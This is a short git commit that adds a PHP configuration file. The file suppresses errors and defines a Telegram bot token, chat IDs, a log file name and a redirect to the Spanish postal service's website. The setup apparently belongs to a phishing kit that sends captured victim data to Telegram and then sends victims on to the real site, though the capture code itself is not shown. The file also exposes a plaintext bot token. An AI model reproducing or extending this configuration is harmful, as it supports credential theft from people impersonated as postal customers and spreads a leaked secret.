04e2a1d0aa7f3a0f6f87307e3cf41911f2b92ada
SPECIAL2188 <120571006+SPECIAL2188@users.noreply.github.com>
2022-12-14 14:14:00 +0000

    grupo

---
+++ settings/conf.php
@@ -0,0 +1,13 @@
+<?php
+
+error_reporting(0);
+
+define("TELEGRAM_TOKEN", "5594701239:AAFxMw7yg1oML07yDuPQ_5lYLPLCNet1Ass");
+define("TELEGRAM_CHAT_ID", "788766138");
+define("TELEGRAM_CHAT_IDD", "-788766138");
+define("TXT_FILE_NAME", 'mjinina.txt');
+define("REDIRECT_WEBSITE", "https://www.correos.com/grupo-correos/");
+
+
+
+?>
